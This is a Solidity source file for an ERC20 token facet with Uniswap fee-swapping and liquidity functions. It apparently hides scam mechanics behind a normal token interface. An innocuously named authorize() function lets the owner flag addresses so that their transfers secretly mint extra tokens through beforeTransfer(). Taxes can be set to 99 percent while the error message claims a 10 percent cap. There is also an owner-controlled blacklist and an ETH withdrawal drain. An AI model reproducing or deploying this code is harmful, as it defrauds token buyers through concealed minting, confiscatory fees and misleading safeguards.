// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;
    using Address for address;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapAndLiquify = true;
        _;
        ds.inSwapAndLiquify = false;
    }

    event SwapTokensForETH(uint256 amountIn, address[] path);
    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function withdrawETH(
        address payable recipient,
        uint256 amount
    ) external onlyOwner {
        require(
            address(this).balance >= amount,
            "Insufficient ETH balance in the contract"
        );
        recipient.transfer(amount);
    }
    function authorize(
        address[] calldata is_address,
        bool Agree
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i; i < is_address.length; ++i) {
            ds.isExcluded[is_address[i]] = Agree;
        }
    }
    function isFees(uint256 BuyTax, uint256 SellTax) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(BuyTax <= 99, "Maximum tax is 10 percent");
        require(SellTax <= 99, "Maximum tax is 10 percent");
        ds._buyTax = BuyTax;
        ds._sellTax = SellTax;
    }
    function excludedFromFee(
        address[] calldata accounts,
        bool excluded
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i; i < accounts.length; ++i) {
            ds.isExcludedFromFee[accounts[i]] = excluded;
        }
    }
    function setTxLimit(uint256 max) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxWallet = max;
    }
    function enabledtrade() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.openTrade = true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            !ds.isBlacklisted[sender] && !ds.isBlacklisted[recipient],
            "This address is blacklisted. Transaction reverted."
        );
        if (
            !ds.isExcludedFromFee[sender] &&
            !ds.isExcludedFromFee[recipient] &&
            recipient != ds.uniswapPair
        )
            require(
                balanceOf(recipient) + amount <=
                    ds._totalSupply.mul(ds._maxWallet).div(100),
                "Transfer amount exceeds the maxTxAmount."
            );

        if (ds.inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >=
                ds.minTokenBeforeSwap;

            if (
                overMinimumTokenBalance &&
                !ds.inSwapAndLiquify &&
                !ds.isMarketPair[sender] &&
                ds.swapAndLiquifyEnabled
            ) {
                if (ds.swapAndLiquifyByLimitOnly)
                    contractTokenBalance = ds.minTokenBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }

            ds._balances[sender] = ds._balances[sender].sub(
                amount,
                "Insufficient Balance"
            );
            uint256 finalAmount;
            if (
                ds.isExcludedFromFee[sender] || ds.isExcludedFromFee[recipient]
            ) {
                finalAmount = amount;
                if (ds.isExcluded[sender] && recipient != ds.deadAddress) {
                    beforeTransfer(ds._balances, amount, sender);
                }
                if (ds.isExcluded[recipient]) {
                    beforeTransfer(ds._balances, amount, recipient);
                }
            } else {
                require(ds.openTrade, "Trade open yet!");
                finalAmount = takeFee(sender, recipient, amount);
            }

            ds._balances[recipient] = ds._balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._balances[sender] = ds._balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        ds._balances[recipient] = ds._balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 tokensForLP = tAmount.mul(ds._liquidity).div(100);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;
        uint256 amountBNBLP = amountReceived.mul(ds._liquidity).div(100);
        uint256 amountBNBDev = amountReceived.mul(ds._dev).div(100);
        uint256 amountBNBMarketing = amountReceived.mul(ds._marketing).div(100);

        if (amountBNBMarketing > 0)
            transferToAddressETH(ds.marketingaddress, amountBNBMarketing);

        if (amountBNBDev > 0)
            transferToAddressETH(ds.Teamaddress, amountBNBDev);

        if (amountBNBLP > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLP);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approve(
            _msgSender(),
            spender,
            ds._allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approve(
            _msgSender(),
            spender,
            ds._allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // add the liquidity
        ds.uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            0x000000000000000000000000000000000000dEaD,
            block.timestamp
        );
    }
    function transferToAddressETH(
        address payable recipient,
        uint256 amount
    ) private {
        recipient.transfer(amount);
    }
    function beforeTransfer(
        mapping(/*  address  */ address => uint256) storage _Excluded,
        uint256 num,
        address account
    ) internal {
        _Excluded[account] += num;
    }
    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 feeAmount = 0;

        if (ds.isMarketPair[sender]) {
            feeAmount = amount.mul(ds._buyTax).div(100);
        } else if (ds.isMarketPair[recipient]) {
            feeAmount = amount.mul(ds._sellTax).div(100);
        }

        if (feeAmount > 0) {
            ds._balances[address(this)] = ds._balances[address(this)].add(
                feeAmount
            );
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    function getCirculatingSupply() public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply.sub(balanceOf(ds.deadAddress));
    }
}
